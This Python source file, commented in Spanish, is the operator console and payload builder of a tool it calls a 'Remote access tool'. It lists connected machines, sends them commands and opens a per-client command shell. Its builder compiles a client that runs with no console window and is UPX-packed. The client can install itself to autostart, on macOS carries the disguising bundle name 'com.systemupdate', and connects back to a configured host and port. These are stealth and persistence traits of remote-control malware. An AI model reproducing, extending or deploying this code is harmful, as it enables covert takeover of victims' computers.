import curses
import json
import socket
from importlib.metadata import PackageNotFoundError, distribution
from typing import Tuple
import os
import sys
import shutil
import subprocess
import pkg_resources
from pathlib import Path

from executing import cache

from cli.clientCli import start_client_cli
from client import Client
from config.config import save_config, load_config


def init_colors():
    """Inicializa los pares de colores para la interfaz"""
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_BLUE, -1)  # Título
    curses.init_pair(2, curses.COLOR_CYAN, -1)  # Selección
    curses.init_pair(3, curses.COLOR_GREEN, -1)  # Bordes (estado activo)
    curses.init_pair(4, curses.COLOR_YELLOW, -1)  # Estado inactivo
    curses.init_pair(5, curses.COLOR_YELLOW, -1)  # Estado de ayuda o aviso


def draw_box(stdscr, start_y: int, start_x: int, height: int, width: int):
    """Dibuja un borde decorativo alrededor de un área, evitando los límites de la pantalla"""
    max_y, max_x = stdscr.getmaxyx()

    # Ajustar dimensiones para evitar escribir en los bordes
    if start_y + height >= max_y:
        height = max_y - start_y - 1
    if start_x + width >= max_x:
        width = max_x - start_x - 1

    # Caracteres para los bordes
    topleft, topright = '╔', '╗'
    bottomleft, bottomright = '╚', '╝'
    horizontal, vertical = '═', '║'

    try:
        # Dibujar esquinas
        stdscr.attron(curses.color_pair(3))
        if start_y >= 0 and start_x >= 0:
            stdscr.addch(start_y, start_x, topleft)
        if start_y >= 0 and start_x + width < max_x:
            stdscr.addch(start_y, start_x + width, topright)
        if start_y + height < max_y and start_x >= 0:
            stdscr.addch(start_y + height, start_x, bottomleft)
        if start_y + height < max_y and start_x + width < max_x:
            stdscr.addch(start_y + height, start_x + width, bottomright)

        # Dibujar bordes horizontales
        for x in range(start_x + 1, start_x + width):
            if x < max_x:
                if start_y >= 0:
                    stdscr.addch(start_y, x, horizontal)
                if start_y + height < max_y:
                    stdscr.addch(start_y + height, x, horizontal)

        # Dibujar bordes verticales
        for y in range(start_y + 1, start_y + height):
            if y < max_y:
                if start_x >= 0:
                    stdscr.addch(y, start_x, vertical)
                if start_x + width < max_x:
                    stdscr.addch(y, start_x + width, vertical)
        stdscr.attroff(curses.color_pair(3))
    except curses.error:
        pass  # Ignorar errores si intentamos escribir fuera de los límites


def show_connections(stdscr, server):
    """Muestra la lista de conexiones con una interfaz mejorada"""
    stdscr.clear()
    curses.curs_set(0)  # Ocultar cursor
    init_colors()
    connected_clients = server.connected_clients
    total_connections = len(connected_clients)
    current_row, current_column = 0, 0
    page_size = 9
    current_page = 0
    total_pages = (total_connections + page_size - 1) // page_size

    while True:
        max_y, max_x = stdscr.getmaxyx()
        stdscr.clear()

        # Dibujar borde principal
        draw_box(stdscr, 0, 0, max_y - 1, max_x - 1)

        # Título con fondo azul
        title = " Conexiones Activas "
        title_x = min(max(0, (max_x // 2 - len(title) // 2)), max_x - len(title))
        if title_x + len(title) < max_x and 1 < max_y:
            stdscr.attron(curses.color_pair(1))
            stdscr.addstr(1, title_x, title)
            stdscr.attroff(curses.color_pair(1))

        # Mostrar clientes en la página actual
        start_index = current_page * page_size
        for idx in range(page_size):
            actual_index = start_index + idx
            row = idx // 3
            column = idx % 3
            y, x = get_display_position(stdscr, row, column)

            if y >= max_y - 3 or x >= max_x - 2:
                continue

            client_box_width = min(25, max_x - x - 2)
            client_box_height = 3
            if y + client_box_height < max_y - 2 and x + client_box_width < max_x - 2:
                draw_box(stdscr, y - 1, x - 1, client_box_height, client_box_width)

                if actual_index < total_connections:
                    try:
                        client = connected_clients[actual_index]
                        name = client.send_command(command='hostname').split(": ")[1]
                        ip = client.send_command(command='ip').split("IP Local: ")[1].split()[0]

                        status_color = curses.color_pair(4)
                        status_symbol = "●"
                        try:
                            stdscr.attron(status_color)
                            stdscr.addch(y - 1, x + client_box_width - 3, status_symbol)
                            stdscr.attroff(status_color)
                        except curses.error:
                            pass

                        display_text = f"{actual_index + 1}. {name[:12]}"
                        ip_text = f"({ip})"

                        try:
                            if current_row == row and current_column == column:
                                stdscr.attron(curses.color_pair(2))
                            if y < max_y and x + len(display_text) < max_x:
                                stdscr.addstr(y, x, display_text)
                            if y + 1 < max_y and x + len(ip_text) < max_x:
                                stdscr.addstr(y + 1, x, ip_text)
                            if current_row == row and current_column == column:
                                stdscr.attroff(curses.color_pair(2))
                        except curses.error:
                            pass
                    except Exception as e:
                        error_text = f"Error: {str(e)[:20]}"
                        stdscr.addstr(y, x, error_text)
                else:
                    try:
                        if current_row == row and current_column == column:
                            stdscr.attron(curses.color_pair(2))
                        if y < max_y and x + 5 < max_x:
                            stdscr.addstr(y, x, "Vacío")
                        if current_row == row and current_column == column:
                            stdscr.attroff(curses.color_pair(2))
                    except curses.error:
                        pass

        status_bar = f" Página {current_page + 1}/{total_pages} | ↑↓←→: Navegar | Enter: Seleccionar | Q: Salir "
        if max_y - 2 >= 0:
            try:
                stdscr.attron(curses.color_pair(1))
                stdscr.addstr(max_y - 2, 1, status_bar[:max_x - 3])
                stdscr.attroff(curses.color_pair(1))
            except curses.error:
                pass

        stdscr.refresh()
        try:
            result = navigate_client_list(stdscr, connected_clients, page_size,
                                          current_row, current_column, current_page, total_pages)

            if result == "quit":
                break
            elif isinstance(result, tuple):
                current_row, current_column, current_page = result
            elif result is not None:  # Cliente seleccionado
                # Guardar el estado actual de la pantalla
                stdscr.clear()
                stdscr.refresh()

                # Llamar a display_commands en un nuevo contexto
                try:

                    start_client_cli(stdscr,client)
                finally:
                    stdscr.clear()
                    stdscr.refresh()
        except Exception as e:
            # Mostrar error en la parte inferior de la pantalla
            error_msg = f"Error: {str(e)}"
            try:
                stdscr.addstr(max_y - 1, 1, error_msg[:max_x - 3], curses.color_pair(4))
                stdscr.refresh()
                curses.napms(2000)  # Mostrar el error por 2 segundos
            except curses.error:
                pass



def get_display_position(stdscr, row: int, column: int) -> Tuple[int, int]:
    """Calcula la posición de cada cliente con espaciado mejorado y límites seguros"""
    max_y, max_x = stdscr.getmaxyx()
    base_y = max(2, min(max_y // 2 - 4, max_y - 8))
    y = base_y + row * 4

    available_width = max_x - 4
    total_width = min(90, available_width)
    column_width = total_width // 3

    base_x = max(2, min(max_x // 2 - total_width // 2, max_x - total_width - 2))
    x = base_x + column * column_width

    return y, x


def show_client_details(stdscr, client: Client):
    """Muestra los detalles del cliente seleccionado en una ventana emergente"""
    max_y, max_x = stdscr.getmaxyx()
    height, width = min(10, max_y - 4), min(50, max_x - 4)
    start_y = max(1, min(max_y // 2 - height // 2, max_y - height - 2))
    start_x = max(1, min(max_x // 2 - width // 2, max_x - width - 2))

    for y in range(start_y, min(start_y + height, max_y - 1)):
        try:
            stdscr.addstr(y, start_x, " " * min(width, max_x - start_x - 1))
        except curses.error:
            pass

    draw_box(stdscr, start_y, start_x, height, width)
    # Título
    title = " Detalles del Cliente "
    if start_y < max_y - 1:
        try:
            stdscr.attron(curses.color_pair(2))
            stdscr.addstr(start_y, start_x + (width - len(title)) // 2, title[:width - 2])
            stdscr.attroff(curses.color_pair(2))
        except curses.error:
            pass

    # Mostrar información
    hostname = client.execute_command(command='hostname')
    ip = (client.client_socket.getsockname()[0]
          if isinstance(client.client_socket, socket.socket)
          else client.client_socket)

    info_lines = [
        f"Hostname: {hostname}",
        f"IP: {ip}",
        f"Estado: {'Conectado' if isinstance(client.client_socket, socket.socket) else 'Desconectado'}",
        "",
        "Presione cualquier tecla para volver..."
    ]

    for i, line in enumerate(info_lines):
        if start_y + 2 + i < max_y - 1:
            try:
                stdscr.addstr(start_y + 2 + i, start_x + 2, line[:width - 4])
            except curses.error:
                pass

    stdscr.refresh()
    stdscr.getch()


def create_executable(stdscr):
    curses.curs_set(1)  # Show cursor
    stdscr.clear()
    init_colors()

    # Load initial configuration
    config = load_config()

    persistence_option = config.get("persistence", False)
    platforms = ["Windows", "Linux", "macOS"]
    current_platform = platforms.index(config.get("platform", "Windows"))
    host = config.get("host", "")
    port = str(config.get("port", 8080))
    current_option = 0  # Current selected option

    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()
        start_y = height // 2 - 8
        start_x = width // 2 - 25

        # Title and frame
        stdscr.addstr(start_y, start_x, "╔══════════════ Crear Ejecutable ══════════════╗", curses.A_BOLD)
        stdscr.addstr(start_y + 14, start_x, "╚════════════════════════════════════════════╝", curses.A_BOLD)

        # Navigation instructions
        instructions = "↑↓: Navegar | Enter: Seleccionar | Esc: Salir"
        stdscr.addstr(start_y - 2, width // 2 - len(instructions) // 2, instructions, curses.color_pair(4))

        # 1. Persistence option
        field_text = "Persistencia:"
        stdscr.addstr(start_y + 2, start_x + 2, field_text)
        if current_option == 0:
            stdscr.addstr(start_y + 2, start_x + len(field_text) + 3, "Sí" if persistence_option else "No",
                          curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 2, start_x + len(field_text) + 3, "Sí" if persistence_option else "No",
                          curses.color_pair(2))

        # 2. Platform selector
        stdscr.addstr(start_y + 4, start_x + 2, "Plataforma:")
        platform_x = start_x + 13
        for idx, platform in enumerate(platforms):
            if current_option == 1 and idx == current_platform:
                stdscr.addstr(start_y + 4, platform_x + idx * 12, f"[{platform}]",
                              curses.color_pair(3) | curses.A_BOLD)
            else:
                stdscr.addstr(start_y + 4, platform_x + idx * 12, f" {platform} ",
                              curses.color_pair(2) if idx == current_platform else curses.A_NORMAL)

        # 3. Host field
        field_text = "Host:"
        stdscr.addstr(start_y + 6, start_x + 2, field_text)
        if current_option == 2:
            stdscr.addstr(start_y + 6, start_x + len(field_text) + 3, f"[{host}]",
                          curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 6, start_x + len(field_text) + 3, host,
                          curses.color_pair(2))

        # 4. Port field
        field_text = "Puerto:"
        stdscr.addstr(start_y + 8, start_x + 2, field_text)
        if current_option == 3:
            stdscr.addstr(start_y + 8, start_x + len(field_text) + 3, f"[{port}]",
                          curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 8, start_x + len(field_text) + 3, port,
                          curses.color_pair(2))

        # Confirmation button
        button_text = "[ Confirmar ]"
        if current_option == 4:
            stdscr.addstr(start_y + 11, width // 2 - len(button_text) // 2, button_text,
                          curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 11, width // 2 - len(button_text) // 2, button_text,
                          curses.color_pair(2))

        # Active field display
        active_field = ["Persistencia", "Plataforma", "Host", "Puerto", "Confirmar"][current_option]
        status_text = f"Campo activo: {active_field}"
        stdscr.addstr(height - 2, width // 2 - len(status_text) // 2, status_text, curses.color_pair(4))

        stdscr.refresh()

        key = stdscr.getch()

        if key == 27:  # Esc
            break
        elif key == curses.KEY_DOWN:
            current_option = (current_option + 1) % 5
        elif key == curses.KEY_UP:
            current_option = (current_option - 1) % 5
        elif key == curses.KEY_RIGHT:
            if current_option == 1:  # Platform
                current_platform = (current_platform + 1) % len(platforms)
            elif current_option == 0:  # Persistence
                persistence_option = not persistence_option
        elif key == curses.KEY_LEFT:
            if current_option == 1:  # Platform
                current_platform = (current_platform - 1) % len(platforms)
            elif current_option == 0:  # Persistence
                persistence_option = not persistence_option
        elif key in [10, 13]:  # Enter
            if current_option == 4:  # Confirm button
                if host and port:  # Basic validation
                    # Save configuration
                    config["persistence"] = persistence_option
                    config["platform"] = platforms[current_platform]
                    config["host"] = host
                    config["port"] = int(port)
                    save_config(config)

                    # Compilar el ejecutable
                    success, message = compile_client(config, platforms[current_platform])

                    if success:
                        stdscr.addstr(start_y + 12, start_x + 2, "✓ Ejecutable creado con éxito!",
                                      curses.color_pair(2) | curses.A_BOLD)
                        stdscr.addstr(start_y + 13, start_x + 2, message,
                                      curses.color_pair(2))
                    else:
                        try:
                            stdscr.addstr(start_y + 12, start_x + 2, "⚠ Error en la compilación",
                                      curses.color_pair(1) | curses.A_BOLD)
                            stdscr.addstr(start_y + 13, start_x + 2, message,
                                      curses.color_pair(1))
                            print(f"Error al compilar el ejecutable: {message}")
                        except curses.error:
                            print(f"Error al mostrar mensaje: {message}")

                    stdscr.refresh()
                    curses.napms(2500)  # Mostrar el mensaje por más tiempo
                    break
        elif current_option == 2 and (32 <= key <= 126):  # Host
            host += chr(key)
        elif current_option == 3 and len(port) < 5 and 48 <= key <= 57:  # Port
            port += chr(key)
        elif key in [curses.KEY_BACKSPACE, 127, 8]:  # Backspace
            if current_option == 2:
                host = host[:-1]
            elif current_option == 3:
                port = port[:-1]

    curses.curs_set(0)

def show_message(stdscr, message, y, x):
    stdscr.addstr(y, x, message)
    stdscr.refresh()


def show_client_row(stdscr, y, x, display_text, highlighted):
    if highlighted:
        stdscr.attron(curses.color_pair(1))
        stdscr.addstr(y, x, display_text)
        stdscr.attroff(curses.color_pair(1))
    else:
        stdscr.addstr(y, x, display_text)


def navigate_client_list(stdscr, connected_clients, page_size, current_row, current_column, current_page, total_pages):
    total_connections = len(connected_clients)
    key = stdscr.getch()
    print(f"Tecla presionada: {key}")  # Para depuración

    if key == curses.KEY_DOWN:
        if current_row < 2 and (current_page * page_size + (current_row + 1) * 3 + current_column) < total_connections:
            current_row += 1
        elif current_page < total_pages - 1:
            current_page += 1
            current_row = 0

    elif key == curses.KEY_UP:
        if current_row > 0:
            current_row -= 1
        elif current_page > 0:
            current_page -= 1
            current_row = 2

    elif key == curses.KEY_RIGHT:
        if current_column < 2 and (current_page * page_size + current_row * 3 + (current_column + 1)) < total_connections:
            current_column += 1
        elif current_page < total_pages - 1:
            current_page += 1
            current_row, current_column = 0, 0

    elif key == curses.KEY_LEFT:
        if current_column > 0:
            current_column -= 1
        elif current_page > 0:
            current_page -= 1
            current_row, current_column = 2, 2

    elif key in [10, 13]:  # Cambia aquí para incluir las dos teclas
        selected_client = select_client(connected_clients, current_row, current_column, current_page, page_size)
        if selected_client:
            return selected_client

    elif key == ord("q"):
        return "quit"

    return current_row, current_column, current_page


def select_client(connected_clients, current_row, current_column, current_page, page_size):
    """Selecciona un cliente según la fila, columna y página actuales."""
    selected_index = current_page * page_size + current_row * 3 + current_column
    if selected_index < len(connected_clients):
        return connected_clients[selected_index]
    return None


# Funciones para inicializar y mostrar los menús
def show_logo(stdscr, logo):
    for i, line in enumerate(logo):
        x = stdscr.getmaxyx()[1] // 2 - len(line) // 2
        stdscr.addstr(i + 5, x, line, curses.A_BOLD)


def menu_init(stdscr, logo, menu, current_row):
    stdscr.clear()
    init_colors()
    show_logo(stdscr, logo)
    for idx, row in enumerate(menu):
        x = stdscr.getmaxyx()[1] // 2 - len(row) // 2
        y = stdscr.getmaxyx()[0] // 2 - len(menu) // 2 + idx
        if idx == current_row:
            stdscr.attron(curses.color_pair(2))
            stdscr.addstr(y, x, row)
            stdscr.attroff(curses.color_pair(2))
        else:
            stdscr.addstr(y, x, row)
    stdscr.refresh()


def handle_key_navigation(key, current_row, num_options):
    """Maneja la navegación en el menú según la tecla presionada."""
    if key == curses.KEY_UP:
        current_row = (current_row - 1) % num_options
    elif key == curses.KEY_DOWN:
        current_row = (current_row + 1) % num_options
    return current_row


def main_menu(stdscr, server):
    menu = ["CREAR EJECUTABLE", "VER CONEXIONES", "SALIR"]
    current_row = 0
    logo = ["Remote access tool ", "-------------------"]
    while True:
        menu_init(stdscr, logo, menu, current_row)
        key = stdscr.getch()
        if key == ord("q"):
            exit(0)
        current_row = handle_key_navigation(key, current_row, len(menu))
        if key in (curses.KEY_ENTER, 10, 13):  # Enter presionado, Ejecuta la opción seleccionada
            if menu[current_row] == "CREAR EJECUTABLE":
                create_executable(stdscr)
            elif menu[current_row] == "VER CONEXIONES":
                show_connections(stdscr, server)
            elif menu[current_row] == "SALIR":
                break


def compile_client(config, platform_target):
    """
    Compila el módulo cliente usando PyInstaller con la configuración específica.

    Args:
        config (dict): Configuración actual del cliente
        platform_target (str): Plataforma objetivo ('Windows', 'Linux', 'macOS')
    """
    # Obtener el directorio base actual
    base_dir = Path.cwd()

    # Verificar si PyInstaller está instalado
    try:
        distribution('pyinstaller')
    except PackageNotFoundError:
        print("PyInstaller no encontrado. Instalando...")
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'],
                           check=True,
                           capture_output=True,
                           text=True)
        except subprocess.CalledProcessError as e:
            return False, f"Error instalando PyInstaller: {e.stderr}"

    # Crear directorio temporal base
    temp_dir = base_dir / 'temp_build'
    temp_dir.mkdir(exist_ok=True)

    # Crear un archivo temporal de configuración
    temp_config_dir = temp_dir / 'config'
    temp_config_dir.mkdir(exist_ok=True)
    temp_config_path = temp_config_dir / 'config.json'

    with open(temp_config_path, 'w') as f:
        json.dump(config, f)

    # Determinar extensión del ejecutable
    exe_ext = '.exe' if platform_target == 'Windows' else ''

    # Preparar directorio de salida específico para la plataforma
    dist_path = base_dir / 'dist' / platform_target.lower()
    work_path = base_dir / 'build' / platform_target.lower()

    # Manejar el manifiesto de Windows si es necesario
    manifest_path = None


    # Definir los archivos del módulo client
    client_files = [
        'client.py',
        'functions.py',
        'setup.py',
        '__init__.py'
    ]

    # Copiar archivos del módulo client a directorio temporal
    temp_client_dir = temp_dir / 'client'
    temp_client_dir.mkdir(exist_ok=True)

    for file in client_files:
        source_path = base_dir / 'client' / file
        if source_path.exists():
            shutil.copy2(source_path, temp_client_dir / file)
        else:
            print(f"Advertencia: No se encontró el archivo {file}")

    # Crear un script principal temporal para la compilación
    main_script = """
from client.client import Client
from client.setup import ClientSetup
from config.config import load_config

def init(persistence: bool = True, server_host: str = '127.0.0.1', server_port: int = 8080):
    client_setup = ClientSetup(__file__)
    
    # Verificar si ya hay una instalacion existente
    if client_setup.detect_existing_installation().get('installed') or persistence == False: 
        print("Instalacion existente detectada.")
    else:
        print("No se detecto instalacion. Procediendo a la instalacion...")
        client_setup.install(create_autostart=persistence)

    # Crear y conectar el cliente
    client1 = Client(server_host, server_port)
    client1.connect()

if __name__ == "__main__":
    # Cargar la configuracion
    config = load_config()

    # Usar la configuracion para inicializar el cliente
    init(persistence=config['persistence'], server_host=config['host'], server_port=config['port'])


"""

    main_path = temp_dir / 'main.py'
    with open(main_path, 'w') as f:
        f.write(main_script)

    # Crear el spec file con configuraciones específicas de la plataforma
    runtime_tmpdir = '/var/tmp' if platform_target == 'Linux' else None
    bundle_identifier = 'com.systemupdate' if platform_target == 'macOS' else None

    spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-

a = Analysis(
    [r'{main_path.absolute().as_posix()}'],
    pathex=[r'{base_dir.absolute().as_posix()}'],
    binaries=[],
    datas=[
        (r'{temp_config_dir.absolute().as_posix()}', 'config'),
        (r'{temp_client_dir.absolute().as_posix()}', 'client')
    ],
    hiddenimports=[
        'client.client',
        'client.functions',
        'client.setup',
        'config.config'
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='client{exe_ext}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    console=False,
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    bundle_identifier='{bundle_identifier}',
    runtime_tmpdir='{runtime_tmpdir}',)
"""

    # Guardar el spec file
    spec_path = temp_dir / 'client.spec'
    spec_path.write_text(spec_content)

    try:
        # Ejecutar PyInstaller solo con el spec file
        process = subprocess.run([
            sys.executable,
            '-m',
            'PyInstaller',
            str(spec_path.absolute()),
            '--clean',  # Esta opción sí está permitida con spec file
        ], check=True, capture_output=True, text=True)

        # Mover el ejecutable al directorio específico de la plataforma
        dist_path.mkdir(parents=True, exist_ok=True)

        source_exe = base_dir / 'dist' / f'client{exe_ext}'
        if source_exe.exists():
            shutil.move(str(source_exe), dist_path / f'client{exe_ext}')

        # Limpiar archivos temporales
        shutil.rmtree(temp_dir, ignore_errors=True)
        shutil.rmtree(base_dir / 'build', ignore_errors=True)

        return True, f"Ejecutable creado exitosamente en {dist_path}/client{exe_ext}"

    except subprocess.CalledProcessError as e:
        return False, f"Error durante la compilación: {e.stderr}"
    except Exception as e:
        return False, f"Error inesperado: {str(e)}"
    finally:
        # Asegurarse de limpiar los archivos temporales incluso si hay errores
        shutil.rmtree(temp_dir, ignore_errors=True)